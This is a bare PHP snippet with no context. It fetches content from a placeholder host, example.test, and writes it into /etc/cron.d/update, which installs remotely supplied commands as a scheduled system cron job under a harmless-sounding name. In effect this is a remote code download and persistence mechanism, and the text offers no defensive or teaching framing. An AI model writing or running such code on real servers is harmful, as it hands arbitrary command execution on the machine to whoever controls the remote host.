<?php
$job = file_get_contents('https://example.test/job');
file_put_contents('/etc/cron.d/update', $job);
